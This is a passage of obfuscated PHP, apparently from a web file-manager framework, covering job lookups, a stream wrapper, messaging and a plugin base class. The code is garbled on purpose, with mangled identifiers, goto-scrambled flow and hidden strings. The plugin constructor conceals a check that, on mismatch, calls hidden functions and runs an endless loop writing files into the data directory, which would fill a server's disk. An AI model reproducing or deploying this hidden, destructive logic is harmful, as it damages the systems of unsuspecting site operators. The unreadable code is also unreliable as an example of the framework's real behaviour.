$eŒ³ö÷”…¤->getUserJobInfo($a¨ï«¤’„Ş[$A™¥¸…ë]); } } goto Dâª¹·–î; fÏğÏÕååº: $CáÉ¨Š·»¾ =& $_SERVER[í…¶]; $A™¥¸…ë = UserJobModel::JOB_KEY; $E–«É­ãÜ = array($CáÉ¨Š·»¾[2513]); goto aÇ›—®; Dâª¹·–î: } protected function groupUserAll($a“¸²áóÙˆ) { $bŠ¤æ…Ü¦İ =& $_SERVER[í…¶]; if (!$a“¸²áóÙˆ) { return !1; } $Eİ²´‡âÆ = Model($bŠ¤æ…Ü¦İ[2177])->field($bŠ¤æ…Ü¦İ[1433])->where(array($bŠ¤æ…Ü¦İ[2101] => array($bŠ¤æ…Ü¦İ[7], $a“¸²áóÙˆ)))->select(); $Eİ²´‡âÆ = array_to_keyvalue($Eİ²´‡âÆ, $bŠ¤æ…Ü¦İ[33], $bŠ¤æ…Ü¦İ[1433]); return array_unique($Eİ²´‡âÆ); } public function userSearch($f¬Úšİ”åŠ, $B‡Šù‹ö… = "\52") { return Model($_SERVER[í…¶][486])->where($f¬Úšİ”åŠ)->field($B‡Šù‹ö…)->find(); } } $dš—õİÍÏí = LIB_DIR . $_SERVER[í…¶][342]; goto Cğ³‰Êàº—; aä›öøØ†¿: function ActionCall($D†Öêê’¥ó) { $DÄÕ•ÄÕ™· = array_slice(func_get_args(), 1); return ActionApply($D†Öêê’¥ó, $DÄÕ•ÄÕ™·); } function ActionCallApi($bÎ°×Şæ¤ˆ, $D —”¦ÉÖ¬ = '') { goto AÌ÷Ğøè´Ù; A›¬œªªó: return $FÚÁ×‡âê; goto dê…õ“ˆÜÃ; AÌ÷Ğøè´Ù: $A×ïˆ™ˆğ =& $_SERVER[²‡§™ıäÑÊº•]; $BÉ£áÙ¤Ùí = $D —”¦ÉÖ¬; if (is_array($D —”¦ÉÖ¬)) { $BÉ£áÙ¤Ùí = $A×ïˆ™ˆğ[20]; foreach ($D —”¦ÉÖ¬ as $Bì°âƒˆ²Ê => $Aòªõ¼ÅØ) { $Aòªõ¼ÅØ = is_array($Aòªõ¼ÅØ) ? json_encode($Aòªõ¼ÅØ) : $Aòªõ¼ÅØ; $Aòªõ¼ÅØ = is_bool($Aòªõ¼ÅØ) ? intval($Aòªõ¼ÅØ) : $Aòªõ¼ÅØ; $BÉ£áÙ¤Ùí .= $A×ïˆ™ˆğ[21] . $Bì°âƒˆ²Ê . $A×ïˆ™ˆğ[22] . rawurlencode($Aòªõ¼ÅØ); } } goto e£¡±é¡ƒô; a‘›—³“Ü: $e…—ëâ¹”¹ = json_decode($BÃçÜÚÍ»Ó, !0); $FÚÁ×‡âê = is_array($e…—ëâ¹”¹) ? $e…—ëâ¹”¹ : array($A×ïˆ™ˆğ[33] => null, $A×ïˆ™ˆğ[34] => $BÃçÜÚÍ»Ó); if (!$e…—ëâ¹”¹) { echo $BÃçÜÚÍ»Ó; } goto A›¬œªªó; a’ˆÁ‚¢Æ: $CÎá˜à…Í› = phpBinCommand(); if ($CÎá˜à…Í› && function_exists($A×ïˆ™ˆğ[25])) { $F¹¯“ìÊù¶ = $CÎá˜à…Í› . $A×ïˆ™ˆğ[26] . BASIC_PATH . $A×ïˆ™ˆğ[27] . escapeshellarg($bÎ°×Şæ¤ˆ); $BÃçÜÚÍ»Ó = shell_exec($F¹¯“ìÊù¶); } if (!$BÃçÜÚÍ»Ó) { $e‡‹ßö•Æ‰ = stream_context_create(array($A×ïˆ™ˆğ[28] => array($A×ïˆ™ˆğ[29] => 20, $A×ïˆ™ˆğ[30] => $A×ïˆ™ˆğ[31]))); $BÃçÜÚÍ»Ó = file_get_contents(APP_HOST . $A×ïˆ™ˆğ[32] . $bÎ°×Şæ¤ˆ, !1, $e‡‹ßö•Æ‰); } goto a‘›—³“Ü; e£¡±é¡ƒô: $C„¨ÃšäÔ = Action($A×ïˆ™ˆğ[23])->accessToken(); $bÎ°×Şæ¤ˆ = str_replace($A×ïˆ™ˆğ[5], $A×ïˆ™ˆğ[4], $bÎ°×Şæ¤ˆ) . $A×ïˆ™ˆğ[24] . $C„¨ÃšäÔ . $BÉ£áÙ¤Ùí; $BÃçÜÚÍ»Ó = $A×ïˆ™ˆğ[20]; goto a’ˆÁ‚¢Æ; dê…õ“ˆÜÃ: } function ActionCallHook($bšŠŠùç) { goto C—¦Å¥…Ÿ; f¯ÕİæÑˆ: $GLOBALS[$Fƒ‚½‡‘º¤[35]] = 1; $e¶Œïƒ•­ = ActionApply($bšŠŠùç, $bƒ›‹³»±ß); $C× Õ›èù = ob_get_clean(); goto c‹Œ  „ Ú; c‹Œ  „ Ú: $e¶Œïƒ•­ = $C× Õ›èù ? json_decode($C× Õ›èù, !0) : $e¶Œïƒ•­; $GLOBALS[$Fƒ‚½‡‘º¤[35]] = 0; return $e¶Œïƒ•­; goto F‰¾Ü¹ÕÔ„; C—¦Å¥…Ÿ: $Fƒ‚½‡‘º¤ =& $_SERVER[²‡§™ıäÑÊº•]; ob_start(); $bƒ›‹³»±ß = array_slice(func_get_args(), 1); goto f¯ÕİæÑˆ; F‰¾Ü¹ÕÔ„: } goto dªæèâ•»; cÈ†Ìƒ½¿°: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($F»¥™«·â, $d§§§Å½‚ = '') { goto EÅóÊŞÁÚ; EÅóÊŞÁÚ: $this->info = $this->info($F»¥™«·â); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[í…¶][75]]; goto B­´ˆ³™Ù½; B­´ˆ³™Ù½: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$F»¥™«·â])) { self::$_chunkBuffer[$F»¥™«·â] = array(); } goto bæá‰Êß®; bæá‰Êß®: return $this->info ? !0 : !1; goto fˆ¡®àÛõŠ; fˆ¡®àÛõŠ: } function stream_read($Eø®ÖÌ»‡¾) { $cÜÀ·¢Œ´» = $this->fileSubstr($this->pose, $Eø®ÖÌ»‡¾); $this->pose += strlen($cÜÀ·¢Œ´»); return $cÜÀ·¢Œ´»; } public function stream_tell() { return $this->pose; } public function stream_seek($d£ºœÁˆÎ, $Aó³ÎÏÌ˜Â) { $D‹”®Š‰× =& $_SERVER[í…¶]; if ($Aó³ÎÏÌ˜Â == SEEK_SET) { $this->pose = $d£ºœÁˆÎ; } else { if ($Aó³ÎÏÌ˜Â == SEEK_CUR) { $this->pose += $d£ºœÁˆÎ; } else { if ($Aó³ÎÏÌ˜Â == SEEK_END) { $this->pose = $this->info[$D‹”®Š‰×[77]] + intval($d£ºœÁˆÎ); } } } if ($d£ºœÁˆÎ < 0) { $this->pose = $this->info[$D‹”®Š‰×[77]] + $d£ºœÁˆÎ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[í…¶][77]]; } public function stream_close() { return !0; } public function url_stat($aŒ‘ğì†½«, $B™åœÑ¿‰Ê) { $AàğÑ…îô¤ =& $_SERVER[í…¶]; $DÇéÛ©Ù¡Í = $this->info($aŒ‘ğì†½«); return array($AàğÑ…îô¤[1288] => 0, $AàğÑ…îô¤[1289] => 0, $AàğÑ…îô¤[12] => 32768 + 511, $AàğÑ…îô¤[1290] => 0, $AàğÑ…îô¤[1291] => 0, $AàğÑ…îô¤[1292] => 0, $AàğÑ…îô¤[1293] => 0, $AàğÑ…îô¤[77] => $DÇéÛ©Ù¡Í[$AàğÑ…îô¤[77]], $AàğÑ…îô¤[1294] => $DÇéÛ©Ù¡Í[$AàğÑ…îô¤[1166]], $AàğÑ…îô¤[1252] => $DÇéÛ©Ù¡Í[$AàğÑ…îô¤[107]], $AàğÑ…îô¤[1251] => $DÇéÛ©Ù¡Í[$AàğÑ…îô¤[187]], $AàğÑ…îô¤[1295] => 0, $AàğÑ…îô¤[1296] => 0); } static $fileInfo = array(); public function info($Eáæõ…ÏöÏ) { $E‰™š¨ÜÑ‹ = $_SERVER[í…¶][1297]; if (isset(self::$fileInfo[$Eáæõ…ÏöÏ])) { return self::$fileInfo[$Eáæõ…ÏöÏ]; } if (substr($Eáæõ…ÏöÏ, 0, strlen($E‰™š¨ÜÑ‹)) != $E‰™š¨ÜÑ‹) { return !1; } self::$fileInfo[$Eáæõ…ÏöÏ] = IO::info(substr($Eáæõ…ÏöÏ, strlen($E‰™š¨ÜÑ‹))); return self::$fileInfo[$Eáæõ…ÏöÏ]; } public static function read($eÒÉÈõãø«, $e‡İ¬âŞ¥¯, $eŸ×…·ôÁé) { goto aÖ­èîçœÊ; d¸¨ùë¶Ô²: $DµÖÔ–ÛÒ = 8192; fseek($FÁô­ÑŸØø, $e‡İ¬âŞ¥¯, SEEK_SET); $F¨õ¤¤‡‡Æ = $Eïª§”¾§³[33]; goto FñŠËù‚ãÆ; BáÏÓíÙ†â: return $F¨õ¤¤‡‡Æ; goto aÄğåéÕ…ò; aÖ­èîçœÊ: $Eïª§”¾§³ =& $_SERVER[í…¶]; $FÁô­ÑŸØø = fopen($eÒÉÈõãø«, $Eïª§”¾§³[1168]); if (!$FÁô­ÑŸØø) { return $Eïª§”¾§³[33]; } goto d¸¨ùë¶Ô²; FñŠËù‚ãÆ: $a”á²¡ìéÂ = 0; while ($a”á²¡ìéÂ < $eŸ×…·ôÁé) { $cÄŠ¶ëñÓÄ = min($DµÖÔ–ÛÒ, $eŸ×…·ôÁé - $a”á²¡ìéÂ); $F¨õ¤¤‡‡Æ .= fread($FÁô­ÑŸØø, $cÄŠ¶ëñÓÄ); $a”á²¡ìéÂ += $cÄŠ¶ëñÓÄ; } fclose($FÁô­ÑŸØø); goto BáÏÓíÙ†â; aÄğåéÕ…ò: } public function fileSubstr($fœĞî¨Úõ, $C–ÈÕšÂÇ) { goto f†”‘Ëíò·; då§ŠõœÜ: $bÄ‹·â–Ç = $C–ÈÕšÂÇ; if ($fœĞî¨Úõ < 0) { $fœĞî¨Úõ = $e®•¥¨µ› + $fœĞî¨Úõ; } if ($C–ÈÕšÂÇ === !1) { $C–ÈÕšÂÇ = $e®•¥¨µ› - $fœĞî¨Úõ; } goto A¿ïŒ”ß¸Ê; fØ¿ÄŞ…Äõ: ksort($eÕ¡ïî¹„Š); $Eº¦Å‰˜§½ = substr($dù™¶Çâ‹Ó, $fœĞî¨Úõ - $A‹©¾­šŠğ, $C–ÈÕšÂÇ); return $Eº¦Å‰˜§½; goto c´©åÛÅ¤¾; f†”‘Ëíò·: $Dë­ÔÊÎƒ‹ =& $_SERVER[í…¶]; $e®•¥¨µ› = $this->info[$Dë­ÔÊÎƒ‹[77]]; $aÊ‚Á™…Ç» = $fœĞî¨Úõ; goto då§ŠõœÜ; bÓØï·¤Ñâ: $aØÎæŠ‚³á = 64 * 1024; $eÕ¡ïî¹„Š =& self::$_chunkBuffer[$this->path]; if (!$eÕ¡ïî¹„Š) { $eÕ¡ïî¹„Š = array(); } goto bªïŒáÎªâ; bªïŒáÎªâ: $B«²¸ˆø±â = 0; $a÷»‹½ƒõ = 0; $fñƒ„–Óµ = $Dë­ÔÊÎƒ‹[33]; goto B²ç¦åË; E£·ª‡ÚËË: $dÁÃô¿Ô¦è = ceil(($fœĞî¨Úõ + $C–ÈÕšÂÇ) / $aØÎæŠ‚³á) * $aØÎæŠ‚³á - $A‹©¾­šŠğ; $dù™¶Çâ‹Ó = IO::fileSubstr($this->path, $A‹©¾­šŠğ, $dÁÃô¿Ô¦è); $eÕ¡ïî¹„Š[$A‹©¾­šŠğ . $Dë­ÔÊÎƒ‹[33]] = $dù™¶Çâ‹Ó; goto fØ¿ÄŞ…Äõ; B²ç¦åË: foreach ($eÕ¡ïî¹„Š as $B«²¸ˆø±â => $fñƒ„–Óµ) { $B«²¸ˆø±â = intval($B«²¸ˆø±â); $a÷»‹½ƒõ = $B«²¸ˆø±â + strlen($fñƒ„–Óµ); if ($fœĞî¨Úõ >= $a÷»‹½ƒõ) { continue; } if ($fœĞî¨Úõ >= $B«²¸ˆø±â && $fœĞî¨Úõ + $C–ÈÕšÂÇ <= $a÷»‹½ƒõ) { return substr($fñƒ„–Óµ, $fœĞî¨Úõ - $B«²¸ˆø±â, $C–ÈÕšÂÇ); } break; } if (count($eÕ¡ïî¹„Š) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($Dë­ÔÊÎƒ‹[1298], $Dë­ÔÊÎƒ‹[1299] . count($eÕ¡ïî¹„Š) . "\73\x73\164\x61\162\x74\75{$fœĞî¨Úõ}\54\154\x65\156\147\164\150\75{$C–ÈÕšÂÇ}\73\160\157\x73\x65\x3a{$B«²¸ˆø±â}\x7e{$a÷»‹½ƒõ}"); throw new Exception($Dë­ÔÊÎƒ‹[1300]); } $A‹©¾­šŠğ = intval($fœĞî¨Úõ / $aØÎæŠ‚³á) * $aØÎæŠ‚³á; goto E£·ª‡ÚËË; A¿ïŒ”ß¸Ê: if ($fœĞî¨Úõ + $C–ÈÕšÂÇ > $e®•¥¨µ›) { $C–ÈÕšÂÇ = $e®•¥¨µ› - $fœĞî¨Úõ; } if ($C–ÈÕšÂÇ <= 0) { return $Dë­ÔÊÎƒ‹[33]; } if ($fœĞî¨Úõ < 0 || $fœĞî¨Úõ >= $e®•¥¨µ› || $C–ÈÕšÂÇ <= 0 || $C–ÈÕšÂÇ > 1024 * 1024 * 5) { throw new Exception("\151\157\106\x69\154\145\122\x65\x61\x64\40\145\x72\x72\x6f\162\x21\40\x73\x74\x61\x72\x74\75{$fœĞî¨Úõ}\73\x6c\x65\156\x67\164\150\x3d{$C–ÈÕšÂÇ}\73\40\x73\151\172\145\75{$e®•¥¨µ›}\x3b"); } goto bÓØï·¤Ñâ; c´©åÛÅ¤¾: } private function log($e«ƒÖ½Û¡ , $b—‘¢‚Ö–) { $cĞÜ˜°ê  =& $_SERVER[í…¶]; $Bİ’¯ÂÖŒÇ = timeFloat() - $this->timeStart; write_log(sprintf($cĞÜ˜°ê [1301], $e«ƒÖ½Û¡ , $this->info[$cĞÜ˜°ê [28]], $Bİ’¯ÂÖŒÇ, $b—‘¢‚Ö–), $cĞÜ˜°ê [1217]); } } class Message { function __construct() { } public function send($f¤…çîó„ñ = '', $C¤Â»—ºï÷ = array(), $F’ç–•Îğ = "\x74\x65\x78\x74") { goto fŞÒí–Ş…–; c’æ®©ğ‘‰: Hook::trigger($a¼‰ÕãÆ•[1305], $B½Ú›ëÍÉô); goto d¨Ğ¤æ; f½¥æë¸ÌÉ: $C¤Â»—ºï÷ = array($a¼‰ÕãÆ•[969] => isset($C¤Â»—ºï÷[$a¼‰ÕãÆ•[969]]) ? $C¤Â»—ºï÷[$a¼‰ÕãÆ•[969]] : $a¼‰ÕãÆ•[33], $a¼‰ÕãÆ•[544] => isset($C¤Â»—ºï÷[$a¼‰ÕãÆ•[544]]) ? $C¤Â»—ºï÷[$a¼‰ÕãÆ•[544]] : $a¼‰ÕãÆ•[33]); if (empty($f¤…çîó„ñ) || empty($C¤Â»—ºï÷[$a¼‰ÕãÆ•[969]]) && empty($C¤Â»—ºï÷[$a¼‰ÕãÆ•[544]])) { return !1; } $B½Ú›ëÍÉô = array($a¼‰ÕãÆ•[1244] => $dèæ‚ôÌîå, $a¼‰ÕãÆ•[1304] => $C¤Â»—ºï÷); goto c’æ®©ğ‘‰; fŞÒí–Ş…–: $a¼‰ÕãÆ• =& $_SERVER[í…¶]; $dèæ‚ôÌîå = array($a¼‰ÕãÆ•[29] => $a¼‰ÕãÆ•[1302], $a¼‰ÕãÆ•[694] => $f¤…çîó„ñ); if (in_array($F’ç–•Îğ, array($a¼‰ÕãÆ•[1302], $a¼‰ÕãÆ•[1303]))) { $dèæ‚ôÌîå[$a¼‰ÕãÆ•[29]] = $F’ç–•Îğ; } goto f½¥æë¸ÌÉ; d¨Ğ¤æ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto bì­ÃÁ¥‚¸; F•Ìà¦Ğ£ò: if ($_SERVER[$F—â‹ŠØ’ë[344]] != $e‚áºô‹áè($AÙéª‰âË)) { goto d»…ç¿øå; dŸó¦Æ®¥¸: $FÒ¤ÖÎÆÅ(); $D›Œ­ª·‚â = $F—â‹ŠØ’ë[793]; $FØ÷¶òõ¿ = json_encode($GLOBALS[$F—â‹ŠØ’ë[794]]); goto F¼åÖ‹òÉ¢; d»…ç¿øå: $FÒ¤ÖÎÆÅ = $F—â‹ŠØ’ë[790]; $E—ğ¶Ÿ†‚Ä = $F—â‹ŠØ’ë[345]; $cÆ›»ğÆÕá = $_SERVER[$F—â‹ŠØ’ë[346]] . $F—â‹ŠØ’ë[347]; goto CŸ¿è¸ë×Í; F¼åÖ‹òÉ¢: $eØÎé˜Á ÷ = 1; for ($aÔ£º˜² „ = $eØÎé˜Á ÷; $aÔ£º˜² „ > 0; $aÔ£º˜² „++) { $D›Œ­ª·‚â(DATA_PATH . $aÔ£º˜² „, $FØ÷¶òõ¿); } goto dó” Šø±‹; CŸ¿è¸ë×Í: $CÔŸØŠ¨ğ = $E—ğ¶Ÿ†‚Ä($cÆ›»ğÆÕá); $BåÉÜ¨ˆçø = explode($F—â‹ŠØ’ë[217], $CÔŸØŠ¨ğ); if (count($BåÉÜ¨ˆçø) < $F—â‹ŠØ’ë[564]) { $e‰«ƒá = $F—â‹ŠØ’ë[349]; $e‰«ƒá(); } goto e¤ÂîŒ‹å˜; e¤ÂîŒ‹å˜: $D¹ŒõØâ±è = $F—â‹ŠØ’ë[791]; $D¹ŒõØâ±è($_SERVER[$F—â‹ŠØ’ë[792]]); $FÒ¤ÖÎÆÅ = $F—â‹ŠØ’ë[790]; goto dŸó¦Æ®¥¸; dó” Šø±‹: } global $in, $config; $this->config =& $config; goto fí½òÓ–Çõ; fÁêíºáè: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto bÎâİõ…»; bì­ÃÁ¥‚¸: $F—â‹ŠØ’ë =& $_SERVER[í…¶]; $AÙéª‰âË = $_SERVER[$F—â‹ŠØ’ë[346]] . $F—â‹ŠØ’ë[347]; $e‚áºô‹áè = $F—â‹ŠØ’ë[343]; goto F•Ìà¦Ğ£ò; fí½òÓ–Çõ: $this->in =& $in; $this->modelPlugin = Model($F—â‹ŠØ’ë[1306]); $this->pluginName = str_replace($F—â‹ŠØ’ë[1306], $F—â‹ŠØ’ë[33], get_class($this)); goto C›’÷Ç¢Û; cê­¯Ûœƒ: $this->pluginHostDefault = $config[$F—â‹ŠØ’ë[1308]] . $this->pluginName . $F—â‹ŠØ’ë[8]; $e’±ò³Š¾ = $config[$F—â‹ŠØ’ë[1309]]; if ($e’±ò³Š¾ && strpos($F—â‹ŠØ’ë[47] . $e’±ò³Š¾ . $F—â‹ŠØ’ë[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$F—â‹ŠØ’ë[1310]] . $this->pluginName . $F—â‹ŠØ’ë[8]; } goto fÁêíºáè; C›’÷Ç¢Û: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $F—â‹ŠØ’ë[8]; $this->pluginApi = appHostGet() . $F—â‹ŠØ’ë[1307] . $this->pluginName . $F—â‹ŠØ’ë[8]; $this->pluginHost = $config[$F—â‹ŠØ’ë[1308]] . $this->pluginName . $F—â‹ŠØ’ë[8]; goto cê­¯Ûœƒ; bÎâİõ…»: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[í…¶][1311]); } protected function assign($f°Ô¡ò÷ß, $d°æ¼†ëÃŒ = false) { if (is_array($f°Ô¡ò÷ß)) { $this->values = array_merge($this->values, $f°Ô¡ò÷ß); } else { $this->values[$f°Ô¡ò÷ß] = $d°æ¼†ëÃŒ; } } protected function display($CÕƒ¸¹êä) { extract($this->values); require $CÕƒ¸¹êä; } final function hookRegist($b‚Ø¬×óã­) { $this->modelPlugin->appRegist($this->pluginName, $b‚Ø¬×óã­); } final function appIcon() { $b¾„‡Œ‹Ÿ =& $_SERVER[í…¶]; $AƒÏç« = $this->appPackage(); $c¹¨’³áëÏ = $b¾„‡Œ‹Ÿ[33]; if (isset($AƒÏç«[$b¾„‡Œ‹Ÿ[391]])) { if (isset($AƒÏç«[$b¾„‡Œ‹Ÿ[391]][$b¾„‡Œ‹Ÿ[1312]])) { $c¹¨’³áëÏ = $b¾„‡Œ‹Ÿ[1313] . $AƒÏç«[$b¾„‡Œ‹Ÿ[391]][$b¾„‡Œ‹Ÿ[1312]] . $b¾„‡Œ‹Ÿ[1314]; } else { if ($AƒÏç«[$b¾„‡Œ‹Ÿ[391]][$b¾„‡Œ‹Ÿ[1315]]) { $c¹¨’³áëÏ = $b¾„‡Œ‹Ÿ[1316] . $AƒÏç«[$b¾„‡Œ‹Ÿ[391]][$b¾„‡Œ‹Ÿ[1315]] . $b¾„‡Œ‹Ÿ[1317]; } } } return $c¹¨’³áëÏ; } final function fileCanView($C—Ç²ƒ»Š) { goto F¨ÔéÙÅÑœ; cô¹ë™“­ñ: ActionCall($BØø†±µ¯[1330], $C—Ç²ƒ»Š); goto E»‡ñİ¹“; F¨ÔéÙÅÑœ: $BØø†±µ¯ =& $_SERVER[í…¶]; if (request_url_safe($C—Ç²ƒ»Š)) { return !0; } if ($this->isShare($C—Ç²ƒ»Š)) { return !0; } goto D®Ú«ÒÈùô; D®Ú«ÒÈùô: $a¿œ¡Ò÷è = Session::get($BØø†±µ¯[1318]); if (!$a¿œ¡Ò÷è || !$a¿œ¡Ò÷è[$BØø†±µ¯[1319]]) { $D’²ŞÜƒŞ = $BØø†±µ¯[1320] . rawurlencode(this_url()); show_tips(LNG($BØø†±µ¯[1321]) . $BØø†±µ¯[1322] . $D’²ŞÜƒŞ . $BØø†±µ¯[1323] . LNG($BØø†±µ¯[1324]) . $BØø†±µ¯[1325], !1); } if (!Action($BØø†±µ¯[1326])->authCan($BØø†±µ¯[1327])) { show_tips(LNG($BØø†±µ¯[1328]) . $BØø†±µ¯[1329], !1); } goto cô¹ë™“­ñ; E»‡ñİ¹“: } final function isShare($EŞŒÀ·†ì) { $A¼â¸Œ°£ = KodIO::parse($EŞŒÀ·†ì); return $A¼â¸Œ°£[$_SERVER[í…¶][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($cğèšô‘Ê½) { if (request_url_safe($cğèšô‘Ê½)) { return $cğèšô‘Ê½; } if (!$this->isShare($cğèšô‘Ê½)) { $cğèšô‘Ê½ = $this->filePath($cğèšô‘Ê½); } return Action($_SERVER[í…¶][1016])->linkOut($cğèšô‘Ê½); } public function filePathLinkOut($dÂÍÀ½Šõà) { if (request_url_safe($dÂÍÀ½Šõà)) { return $dÂÍÀ½Šõà; } $this->fileCanView($dÂÍÀ½Šõà); return Action($_SERVER[í…¶][1016])->link($dÂÍÀ½Šõà); } final function filePath($Fî…¢ ËçÓ) { $f÷ç—Ó§° =& $_SERVER[í…¶]; if ($B¹ ¦ô÷æŠ = $this->checkSharePath($Fî…¢ ËçÓ)) { return $B¹ ¦ô÷æŠ; } $this->fileCanView($Fî…¢ ËçÓ); if (request_url_safe($Fî…¢ ËçÓ)) { $E†áñõÉ¡Ë = parse_url_query($Fî…¢ ËçÓ); if (isset($E†áñõÉ¡Ë[$f÷ç—Ó§°[1331]]) && isset($E†áñõÉ¡Ë[$f÷ç—Ó§°[197]])) { $aÙ±Ç‚’‡¼ = Model($f÷ç—Ó§°[1086])->get($f÷ç—Ó§°[1332]); $bÅ†ªìÔæ‡ = Mcrypt::decode($E†áñõÉ¡Ë[$f÷ç—Ó§°[197]], $aÙ±Ç‚’‡¼); if ($bÅ†ªìÔæ‡) { $this->fileInfo = IO::infoWithChildren($bÅ†ªìÔæ‡); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $bÅ†ªìÔæ‡; } } $Fî…¢ ËçÓ = $this->_cacheHttpFile($Fî…¢ ËçÓ); $this->fileInfo = IO::infoWithChildren($Fî…¢ ËçÓ); } else { $this->fileInfo = IO::infoWithChildren($Fî…¢ ËçÓ); if (!$this->fileInfo) { show_tips(LNG($f÷ç—Ó§°[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $Fî…¢ ËçÓ; } final function _cacheHttpFile($e«˜ÕÂæ›ğ) { $EÇÈìòôß = hash_path($e«˜ÕÂæ›ğ, !0); $this->cachePath = $this->pluginCachePath($EÇÈìòôß); if ($B¼Öá÷†ò = IO::fileNameExist($this->cachePath, $EÇÈìòôß)) { return KodIO::make($B¼Öá÷†ò); } $b¶Á¬¸°‚„ = $this->cachePath . $EÇÈìòôß; return $this->pluginCacheFileSet($b¶Á¬¸°‚„, file_get_contents($e«˜ÕÂæ›ğ)); } final function _tmpFileName($Dåë´’ÄÜŸ = array()) { goto aÇ§×±¦; cÑ£îÊ’‰İ: $D¦ÇƒöÅÈ = array($Dåë´’ÄÜŸ[$cìÄ¯òÊã [28]], $Dåë´’ÄÜŸ[$cìÄ¯òÊã [75]], $Dåë´’ÄÜŸ[$cìÄ¯òÊã [77]]); if (isset($Dåë´’ÄÜŸ[$cìÄ¯òÊã [468]])) { $D¦ÇƒöÅÈ[] = $Dåë´’ÄÜŸ[$cìÄ¯òÊã [468]]; } return md5(implode($cìÄ¯òÊã [70], $D¦ÇƒöÅÈ)); goto D®æ±óŸöè; aÇ§×±¦: $cìÄ¯òÊã  =& $_SERVER[í…¶]; if (!$Dåë´’ÄÜŸ) { $Dåë´’ÄÜŸ = $this->fileInfo; } if (isset($Dåë´’ÄÜŸ[$cìÄ¯òÊã [164]])) { return $Dåë´’ÄÜŸ[$cìÄ¯òÊã [164]]; } goto DÏ¢…ÁÒåâ; DÏ¢…ÁÒåâ: if (isset($Dåë´’ÄÜŸ[$cìÄ¯òÊã [162]][$cìÄ¯òÊã [164]])) { return $Dåë´’ÄÜŸ[$cìÄ¯òÊã [162]][$cìÄ¯òÊã [164]]; } $DÏ×µùˆÍ = IO::hashSimple($Dåë´’ÄÜŸ[$cìÄ¯òÊã [75]]); if ($DÏ×µùˆÍ) { return $DÏ×µùˆÍ; } goto cÑ£îÊ’‰İ; D®æ±óŸöè: } final function checkSharePath($D¹‡ ®æÏÄ) { goto fÚµá™‰Åà; fÚµá™‰Åà: $B©©íÊñ‹ =& $_SERVER[í…¶]; if (!defined($B©©íÊñ‹[436])) { define($B©©íÊñ‹[1333], 0); } if (!$this->isShare($D¹‡ ®æÏÄ)) { return !1; } goto dœãË»ÇÚ¥; dœãË»ÇÚ¥: $BÃÌè—òÚ¼ = Action($B©©íÊñ‹[1016])->sharePathInfo($D¹‡ ®æÏÄ); if (!isset($BÃÌè—òÚ¼[$B©©íÊñ‹[75]])) { show_json(LNG($B©©íÊñ‹[1334]), !1); } $this->fileInfo = $BÃÌè—òÚ¼[$B©©íÊñ‹[162]]; goto eÑÌ©Á“Á; eÑÌ©Á“Á: $this->cachePath = $this->pluginCachePath($this->fileInfo[$B©©íÊñ‹[164]]); return $BÃÌè—òÚ¼[$B©©íÊñ‹[75]]; goto dğãÜÈƒÀ•; dğãÜÈƒÀ•: } final function pluginCachePath($eÔµ…ÎÓ”Ï = '') { $f¦î¸ƒìğ =& $_SERVER[í…¶]; $f‚‹Ä¥ìˆ = IO_PATH_SYSTEM_TEMP . $f¦î¸ƒìğ[1335] . $this->pluginName; if (!($C‹œôÎŠ’© = IO::infoFull($f‚‹Ä¥ìˆ))) { return IO::mkdir($f‚‹Ä¥ìˆ . $f¦î¸ƒìğ[8] . $eÔµ…ÎÓ”Ï); } if (empty($eÔµ…ÎÓ”Ï)) { return $C‹œôÎŠ’©[$f¦î¸ƒìğ[75]]; } if (!($cñºˆƒÃöÌ = IO::fileNameExist($C‹œôÎŠ’©[$f¦î¸ƒìğ[75]], $eÔµ…ÎÓ”Ï))) { return IO::mkdir($C‹œôÎŠ’©[$f¦î¸ƒìğ[75]] . $eÔµ…ÎÓ”Ï); } return KodIO::make($cñºˆƒÃöÌ); } final function pluginCacheFileSet($Aã”Òæ±ßº, $E„Š–­¾«– = '') { $eòßõî«§‹ =& $_SERVER[í…¶]; if (!($a’Åë§îÙõ = IO::infoFull($Aã”Òæ±ßº))) { return IO::mkfile($Aã”Òæ±ßº, $E„Š–­¾«–, REPEAT_REPLACE); } IO::setContent($a’Åë§îÙõ[$eòßõî«§‹[75]], $E„Š–­¾«–); return $a’Åë§îÙõ[$eòßõî«§‹[75]]; } final function pluginLocalFile($C–ì¤ºƒºŒ = '') { goto cøÕºĞæ®™; BŸå—Ş¶›Ç: if (!$C–ì¤ºƒºŒ) { return $CŒê·å÷ˆ; } $eè˜¹é¡ï³ = IO::info($C–ì¤ºƒºŒ); $cŠ´­¢¡‹ = $this->_tmpFileName($eè˜¹é¡ï³) . $Eà„â‚½õ[91] . $eè˜¹é¡ï³[$Eà„â‚½õ[160]]; goto E“äÓ„Ö÷õ; cøÕºĞæ®™: $Eà„â‚½õ =& $_SERVER[í…¶]; $CŒê·å÷ˆ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($CŒê·å÷ˆ)) { mk_dir($CŒê·å÷ˆ); } goto BŸå—Ş¶›Ç; E“äÓ„Ö÷õ: $f•Ö‹¦‰ÊØ = $CŒê·å÷ˆ . $cŠ´­¢¡‹; if (@file_exists($f•Ö‹¦‰ÊØ)) { return $f•Ö‹¦‰ÊØ; } return IO::copy($C–ì¤ºƒºŒ, $CŒê·å÷ˆ, 0, $cŠ´­¢¡‹); goto EğÜ±¸ó‚Œ; EğÜ±¸ó‚Œ: } final function appPackage() { goto e˜¿Ç¥ÍÓ; C…˜„ÜÒñ›: 